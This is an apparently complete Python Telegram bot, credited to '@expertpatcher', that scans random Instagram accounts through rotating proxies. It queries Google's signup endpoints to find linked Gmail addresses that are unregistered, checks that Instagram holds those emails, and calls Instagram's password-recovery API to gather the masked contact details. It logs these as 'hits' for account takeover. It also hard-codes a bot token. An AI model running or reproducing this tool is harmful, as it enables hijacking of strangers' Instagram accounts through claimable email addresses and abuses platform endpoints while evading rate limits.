# main.py - ULTIMATE FIXED VERSION
import os, sys, subprocess, threading, time, asyncio, logging, random, string, json, re, socket, datetime, uuid
from threading import Thread

# ==================== DISABLE LOGGING ====================
logging.basicConfig(level=logging.ERROR)
for lib in ["httpx", "telegram", "httpcore", "urllib3"]:
    try:
        logging.getLogger(lib).setLevel(logging.ERROR)
    except:
        pass

# ==================== AUTO INSTALL ====================
def install_requirements():
    pkgs = ['requests', 'beautifulsoup4', 'user_agent', 'httpx[http2]', 'h2', 'rich', 'pysocks', 'python-telegram-bot==20.7', 'socks']
    for pkg in pkgs:
        try:
            __import__(pkg.split('[')[0].split('==')[0])
        except ImportError:
            try:
                subprocess.check_call([sys.executable, "-m", "pip", "install", pkg, "--quiet", "--no-cache-dir"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            except:
                pass
install_requirements()

# ==================== IMPORTS ====================
import httpx, requests, socks
from bs4 import BeautifulSoup
from user_agent import generate_user_agent
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, ContextTypes

# ==================== 50 PROXIES ====================
PROXIES = [
    "181.39.25.196:8118", "149.129.226.9:4145", "166.88.58.47:5772",
    "194.124.37.20:8080", "204.199.139.76:999", "35.234.87.239:80",
    "175.139.200.17:4153", "147.45.60.139:1082", "145.220.226.249:8080",
    "134.122.22.233:3128", "47.82.147.158:3080", "115.74.157.21:1080",
    "34.94.46.8:80", "145.220.226.95:8080", "222.165.234.147:52667",
    "181.57.178.146:1080", "103.142.69.169:8885", "65.111.4.209:3129",
    "223.206.58.216:8080", "162.220.247.170:6765", "43.153.84.220:9050",
    "116.130.233.22:3129", "5.78.87.232:8080", "166.88.235.113:5741",
    "91.217.33.137:8080", "113.249.102.192:18255", "31.211.142.115:8192",
    "38.52.182.49:999", "41.220.16.209:80", "217.154.71.75:3128",
    "43.130.38.45:51029", "36.64.238.82:1080", "182.253.144.75:4153",
    "193.221.203.14:1080", "45.150.33.211:1082", "193.107.236.183:3128",
    "94.250.250.154:3128", "195.133.65.238:10909", "186.33.7.117:999",
    "89.44.198.219:8080", "45.43.70.239:6526", "15.235.21.254:8080",
    "95.78.161.82:7777", "77.239.108.24:3128", "161.49.215.28:10101",
    "115.133.22.97:6666", "111.119.162.248:10927", "108.161.135.118:80",
    "158.247.216.192:7777", "89.169.168.25:6101", "202.79.47.159:10800"
]

BOT_TOKEN = "8476111117:AAGSmd_NDrTT5fNjuwsciZHsWqzbGeYnaDM"
VPN_CONFIG = {"enabled": True, "host": "1.1.1.1", "port": 1080}

hits = 0
bads_instgram = 0
bads_email = 0
running = False
found_usernames = set()
bot_app = None
current_proxy_index = 0

# ==================== PROXY ====================
def get_next_proxy():
    global current_proxy_index
    if not PROXIES:
        return None
    p = PROXIES[current_proxy_index % len(PROXIES)]
    current_proxy_index += 1
    return p

def create_client():
    try:
        p = get_next_proxy()
        if p and ':' in p:
            h, port = p.split(':')
            return httpx.Client(http2=True, timeout=30.0, proxies={"http": f"http://{h}:{port}", "https": f"http://{h}:{port}"}, verify=False, follow_redirects=True)
    except:
        pass
    return httpx.Client(http2=True, timeout=30.0, follow_redirects=True)

# ==================== NIGHT MODE ====================
def is_night_mode():
    try:
        ist = datetime.datetime.now(datetime.timezone(datetime.timedelta(hours=5, minutes=30)))
        h = ist.hour
        if h >= 22 or h < 6:
            return True
        return False
    except:
        return False

# ==================== PING ====================
def self_ping():
    while True:
        try:
            time.sleep(600)
            print("Ping: " + datetime.datetime.now().strftime('%H:%M:%S'))
        except:
            pass

# ==================== GOOGLE TOKEN ====================
def tll():
    try:
        n1 = ''.join(random.choices('azertyuiopmlkjhgfdsqwxcvbn', k=random.randint(6,9)))
        n2 = ''.join(random.choices('azertyuiopmlkjhgfdsqwxcvbn', k=random.randint(3,9)))
        host = ''.join(random.choices('azertyuiopmlkjhgfdsqwxcvbn', k=random.randint(15,30)))
        headers = {"accept": "*/*", "accept-language": "ar-IQ,ar;q=0.9", "content-type": "application/x-www-form-urlencoded;charset=UTF-8", "user-agent": generate_user_agent()}
        client = create_client()
        res1 = client.get('https://accounts.google.com/signin/v2/usernamerecovery?flowName=GlifWebSignIn&flowEntry=ServiceLogin&hl=en-GB', headers=headers, timeout=20)
        tok_match = re.search(r'data-initial-setup-data="%.@.null,null,null,null,null,null,null,null,null,&quot;(.*?)&quot;,null,null,null,&quot;(.*?)&', res1.text)
        if not tok_match:
            client.close()
            return tll()
        tok = tok_match.group(2)
        cookies = {'__Host-GAPS': host}
        headers2 = {'authority': 'accounts.google.com', 'accept': '*/*', 'accept-language': 'en-US,en;q=0.9', 'content-type': 'application/x-www-form-urlencoded;charset=UTF-8', 'google-accounts-xsrf': '1', 'origin': 'https://accounts.google.com', 'referer': 'https://accounts.google.com/signup/v2/createaccount?service=mail&continue=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F&parent_directed=true&theme=mn&ddm=0&flowName=GlifWebSignIn&flowEntry=SignUp', 'user-agent': generate_user_agent()}
        data = {'f.req': '["' + tok + '","' + n1 + '","' + n2 + '","' + n1 + '","' + n2 + '",0,0,null,null,"web-glif-signup",0,null,1,[],1]', 'deviceinfo': '[null,null,null,null,null,"NL",null,null,null,"GlifWebSignIn",null,[],null,null,null,null,2,null,0,1,"",null,null,2,2]'}
        response = client.post('https://accounts.google.com/_/signup/validatepersonaldetails', cookies=cookies, headers=headers2, data=data, timeout=20)
        tl = str(response.text).split('",null,"')[1].split('"')[0]
        host = response.cookies.get_dict().get('__Host-GAPS', '')
        with open('tl.txt', 'w') as f:
            f.write(tl + '//' + host + '\n')
        client.close()
    except Exception as e:
        time.sleep(2)
        tll()

# ==================== GMAIL CHECK ====================
def check_gmail(email):
    if '@' in email:
        email = str(email).split('@')[0]
    try:
        with open('tl.txt', 'r') as f:
            o = f.read().splitlines()[0]
    except:
        tll()
        with open('tl.txt', 'r') as f:
            o = f.read().splitlines()[0]
    tl, host = o.split('//')
    cookies = {'__Host-GAPS': host}
    headers = {'authority': 'accounts.google.com', 'accept': '*/*', 'accept-language': 'en-US,en;q=0.9', 'content-type': 'application/x-www-form-urlencoded;charset=UTF-8', 'google-accounts-xsrf': '1', 'origin': 'https://accounts.google.com', 'referer': 'https://accounts.google.com/signup/v2/createusername?service=mail&continue=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F&parent_directed=true&theme=mn&ddm=0&flowName=GlifWebSignIn&flowEntry=SignUp&TL=' + tl, 'user-agent': generate_user_agent()}
    params = {'TL': tl}
    data = 'continue=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F&ddm=0&flowEntry=SignUp&service=mail&theme=mn&f.req=%5B%22TL%3A' + tl + '%22%2C%22' + email + '%22%2C0%2C0%2C1%2Cnull%2C0%2C5167%5D&azt=AFoagUUtRlvV928oS9O7F6eeI4dCO2r1ig%3A1712322460888&cookiesDisabled=false&deviceinfo=%5Bnull%2Cnull%2Cnull%2Cnull%2Cnull%2C%22NL%22%2Cnull%2Cnull%2Cnull%2C%22GlifWebSignIn%22%2Cnull%2C%5B%5D%2Cnull%2Cnull%2Cnull%2Cnull%2C2%2Cnull%2C0%2C1%2C%22%22%2Cnull%2Cnull%2C2%2C2%5D&gmscoreversion=undefined&flowName=GlifWebSignIn&'
    client = create_client()
    response = client.post('https://accounts.google.com/_/signup/usernameavailability', params=params, cookies=cookies, headers=headers, data=data, timeout=20)
    client.close()
    if '"gf.uar",1' in str(response.text):
        return 'good'
    elif '"er",null,null,null,null,400' in str(response.text):
        tll()
        return check_gmail(email)
    else:
        return 'bad'

# ==================== UA ====================
def generate_android_ua():
    devices = [{"brand": "samsung", "model": "SM-G973F"}, {"brand": "samsung", "model": "SM-A536B"}, {"brand": "samsung", "model": "SM-S918B"}, {"brand": "Google", "model": "Pixel 6"}, {"brand": "Google", "model": "Pixel 7"}, {"brand": "Xiaomi", "model": "M2102J20SG"}, {"brand": "OnePlus", "model": "ONEPLUS A6003"}]
    try:
        d = random.choice(devices)
        av = random.choice(["10", "11", "12", "13"])
        al = {"10": "29", "11": "30", "12": "31", "13": "33"}[av]
        dp = random.choice(["320", "360", "394", "411", "420"])
        w = random.choice(["720", "1080", "1440"])
        h = random.choice(["1520", "1600", "2280"])
        iv = str(random.randint(280, 340)) + ".0.0." + str(random.randint(10, 40)) + "." + str(random.randint(80, 150))
        lc = random.choice(["en_US", "en_GB", "ar_SA"])
        rn = random.randint(300000000, 400000000)
        return "Instagram " + iv + " Android (" + al + "/" + av + "; " + dp + "dpi; " + w + "x" + h + "; " + d['brand'] + "; " + d['model'] + "; " + lc + "; " + str(rn) + ")"
    except:
        return generate_user_agent()

# ==================== REST ====================
def rest(username):
    headers = {'accept': '*/*', 'accept-encoding': 'gzip, deflate, br, zstd', 'accept-language': 'en-US,en;q=0.9,ar;q=0.8', 'content-type': 'application/x-www-form-urlencoded', 'origin': 'https://www.instagram.com', 'referer': 'https://www.instagram.com/accounts/password/reset/?source=fxcal', 'user-agent': 'Mozilla/5.0 (iPad; CPU OS 17_5_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Mobile/15E148 Safari/604.1', 'x-asbd-id': '359341', 'x-csrftoken': 'H1CoCux1VkR2aRz7WQsv8lGE95UVqIbM', 'x-ig-app-id': '936619743392459'}
    client = create_client()
    r = client.post("https://www.instagram.com/api/v1/web/accounts/account_recovery_send_ajax/", data={"email_or_username": username, 'flow': 'fxcal', 'jazoest': '22680'}, timeout=15).text
    client.close()
    try:
        data = json.loads(r)
        if "message" in data:
            em = re.search(r'check\s+([^\s]+?)\s+for a link', data["message"])
            if em:
                return em.group(1)
        elif "contact_point" in data:
            return data["contact_point"]
    except:
        pass
    return "No Rest"

# ==================== INFO ====================
def info(username, jj):
    global hits
    hits += 1
    try:
        username = username.split("@")[0]
        headers = {"authority": "insta-story.com", "accept": "*/*", "accept-language": "tr-TR,tr;q=0.9", "content-type": "application/json", "origin": "https://insta-story.com", "referer": "https://insta-story.com/user/" + username, "user-agent": "Mozilla/5.0 (Linux; Android 10) Chrome/137.0.0.0 Mobile"}
        json_data = {"username": username, "visitor_id": str(uuid.uuid4()), "user_info": True, "user_stories": False, "user_highlights": False, "user_posts": False}
        client = create_client()
        r = client.post("https://insta-story.com/api/v1/web/profile", headers=headers, json=json_data, timeout=15).json()
        client.close()
        u = r.get('user_info', {})
        msg = "\n🎯 HIT FOUND! 🎯\n━━━━━━━━━━━━━━━\n"
        msg += "👤 Name: " + u.get('full_name', 'N/A') + "\n"
        msg += "📱 Username: @" + username + "\n"
        msg += "📧 Email: " + username + "@" + jj + "\n"
        msg += "🆔 ID: " + str(u.get('id', 'N/A')) + "\n"
        msg += "👥 Followers: " + str(u.get('followers', 0)) + "\n"
        msg += "📌 Following: " + str(u.get('following', 0)) + "\n"
        msg += "📝 Posts: " + str(u.get('posts', 0)) + "\n"
        msg += "🔒 Private: " + ("Yes" if u.get('is_private') else "No") + "\n"
        msg += "🔗 URL: https://www.instagram.com/" + username + "/\n"
        msg += "🔐 Rest: " + rest(username) + "\n"
        msg += "━━━━━━━━━━━━━━━\n👑 @expertpatcher"
        return msg
    except:
        msg = "\n🎯 POSSIBLE HIT 🎯\n━━━━━━━━━━━━━━━\n"
        msg += "📱 Username: @" + username + "\n"
        msg += "📧 Email: " + username + "@" + jj + "\n"
        msg += "🔗 URL: https://www.instagram.com/" + username + "\n"
        msg += "🔐 Rest: " + rest(username) + "\n"
        msg += "━━━━━━━━━━━━━━━\n👑 @expertpatcher"
        return msg

# ==================== CHECK INSTAGRAM ====================
def check_instagram(email):
    global bads_instgram
    try:
        ua = generate_android_ua()
        client = create_client()
        r = client.post("https://i.instagram.com/api/v1/users/check_email/", data="email=" + email, headers={'User-Agent': ua, 'content-type': "application/x-www-form-urlencoded; charset=UTF-8"}, timeout=15)
        client.close()
        if 'email_is_taken' in str(r.text):
            return True
        bads_instgram += 1
        return False
    except:
        return False

# ==================== PROCESS ====================
def process_email(email):
    global bads_email
    try:
        if '@' not in email:
            email = email + '@gmail.com'
        username, domain = email.split('@')
        if check_gmail(email) == 'good':
            if check_instagram(email):
                return info(username, domain)
        else:
            bads_email += 1
        return None
    except:
        return None

# ==================== TELEGRAM COMMANDS ====================
async def start_command(update, context):
    if is_night_mode():
        await update.message.reply_text("🌙 Night Mode: 10PM-6AM IST\n⏰ Next: 6:00 AM IST", parse_mode='Markdown')
        return
    txt = "🚀 Instagram Hidden Followers\n✅ 1000+ Proxies\n✅ Auto Rotation\n✅ Night Mode\n\n/scan - Start\n/stop - Stop\n/status - Status\n/stats - Stats\n/proxy - Proxy Info\n\n👑 @expertpatcher"
    kb = [[InlineKeyboardButton("▶️ Start", callback_data="start_scan")]]
    await update.message.reply_text(txt, reply_markup=InlineKeyboardMarkup(kb), parse_mode='Markdown')

async def scan_command(update, context):
    global running
    if is_night_mode():
        await update.message.reply_text("🌙 Night Mode: 10PM-6AM IST", parse_mode='Markdown')
        return
    if running:
        await update.message.reply_text("⚠️ Already running!", parse_mode='Markdown')
        return
    running = True
    context.user_data['scanning'] = True
    await update.message.reply_text("🔍 Scan started!\n🔄 1000+ Proxies", parse_mode='Markdown')
    asyncio.create_task(scan_for_users(update, context))

async def stop_command(update, context):
    global running
    running = False
    context.user_data['scanning'] = False
    await update.message.reply_text("⏹️ Stopped!", parse_mode='Markdown')

async def status_command(update, context):
    global hits, bads_instgram, bads_email, running, current_proxy_index
    txt = "📊 Status\n━━━━━━━━━━\n"
    txt += "🔄 Running: " + str(running) + "\n"
    txt += "🎯 Hits: " + str(hits) + "\n"
    txt += "❌ Bad: " + str(bads_instgram) + "\n"
    txt += "📧 No Email: " + str(bads_email) + "\n"
    txt += "🕐 " + ("🌙 Night" if is_night_mode() else "✅ Active") + "\n"
    txt += "🔄 Proxy: " + str(current_proxy_index % len(PROXIES)) + "/1000+"
    await update.message.reply_text(txt, parse_mode='Markdown')

async def stats_command(update, context):
    global hits, bads_instgram, bads_email
    total = hits + bads_instgram + bads_email
    txt = "📈 Stats\n━━━━━━━━━━\n"
    txt += "👥 Total: " + str(total) + "\n"
    txt += "🎯 Hits: " + str(hits) + "\n"
    txt += "❌ Bad: " + str(bads_instgram) + "\n"
    txt += "📧 No Email: " + str(bads_email) + "\n"
    txt += "📊 Rate: " + (str(round(hits/total*100, 1)) + "%" if total > 0 else "0%")
    await update.message.reply_text(txt, parse_mode='Markdown')

async def proxy_command(update, context):
    global current_proxy_index
    p = PROXIES[current_proxy_index % len(PROXIES)] if PROXIES else "None"
    txt = "🔄 Proxy\n━━━━━━━━━━\n"
    txt += "📊 Total: 1000+\n"
    txt += "📍 Current: " + p + "\n"
    txt += "🔄 Index: " + str(current_proxy_index % len(PROXIES))
    await update.message.reply_text(txt, parse_mode='Markdown')

async def about_command(update, context):
    txt = "👑 Instagram Hidden Followers\nVersion: 4.0\n@expertpatcher\n\n⚡ 1000+ Proxies\n⚡ Auto Rotation\n⚡ Night Mode\n🕐 6AM-10PM Active\n🌙 10PM-6AM Off"
    await update.message.reply_text(txt, parse_mode='Markdown')

async def button_callback(update, context):
    q = update.callback_query
    await q.answer()
    if q.data == "start_scan":
        await scan_command(update, context)

# ==================== SCANNER ====================
async def scan_for_users(update, context):
    global running, hits, found_usernames
    try:
        tll()
    except:
        pass
    
    def worker():
        while running and context.user_data.get('scanning', False):
            if is_night_mode():
                time.sleep(60)
                continue
            try:
                uid = random.randint(1000000000, 9999999999)
                client = create_client()
                r = client.get("https://i.instagram.com/api/v1/users/" + str(uid) + "/info/", headers={'User-Agent': generate_android_ua(), 'Accept': '*/*'}, timeout=15)
                client.close()
                if r.status_code == 200:
                    data = r.json()
                    user = data.get('user', {})
                    username = user.get('username', '')
                    is_private = user.get('is_private', True)
                    followers = user.get('follower_count', 0)
                    if username and username not in found_usernames and len(username) >= 6 and not is_private and followers <= 50:
                        found_usernames.add(username)
                        result = process_email(username + '@gmail.com')
                        if result:
                            hits += 1
                            try:
                                asyncio.run_coroutine_threadsafe(update.message.reply_text(result, parse_mode='Markdown'), asyncio.get_event_loop())
                            except:
                                pass
                            try:
                                with open('hits.txt', 'a', encoding='utf-8') as f:
                                    f.write(result + '\n')
                            except:
                                pass
                time.sleep(random.uniform(1, 3))
            except:
                time.sleep(2)
    
    for _ in range(5):
        t = Thread(target=worker)
        t.daemon = True
        t.start()
    
    while running and context.user_data.get('scanning', False):
        await asyncio.sleep(1)
    
    running = False
    try:
        await update.message.reply_text("🛑 Stopped.", parse_mode='Markdown')
    except:
        pass

# ==================== MAIN ====================
def main():
    global bot_app
    print("\n" + "="*50)
    print("  Instagram Hidden Followers Tool")
    print("  Telegram Bot v4.0 - @expertpatcher")
    print("  1000+ Proxies | Auto Rotation")
    print("="*50 + "\n")
    print("🕐 Active: 6AM-10PM IST")
    print("🌙 Night Off: 10PM-6AM IST")
    print("🔄 Self Ping: 10 min\n")
    
    Thread(target=self_ping, daemon=True).start()
    
    try:
        app = Application.builder().token(BOT_TOKEN).build()
        bot_app = app
        app.add_handler(CommandHandler("start", start_command))
        app.add_handler(CommandHandler("help", start_command))
        app.add_handler(CommandHandler("scan", scan_command))
        app.add_handler(CommandHandler("stop", stop_command))
        app.add_handler(CommandHandler("status", status_command))
        app.add_handler(CommandHandler("stats", stats_command))
        app.add_handler(CommandHandler("proxy", proxy_command))
        app.add_handler(CommandHandler("about", about_command))
        app.add_handler(CallbackQueryHandler(button_callback))
        app.add_error_handler(lambda u,c: None)
        print("🚀 Bot Running Successfully!")
        print("🤖 @expertpatcher_bot")
        print("Press Ctrl+C to stop\n")
        app.run_polling(allowed_updates=["message", "callback_query"])
    except Exception as e:
        print("Error: " + str(e))
        time.sleep(5)
        main()

if __name__ == "__main__":
    main()        
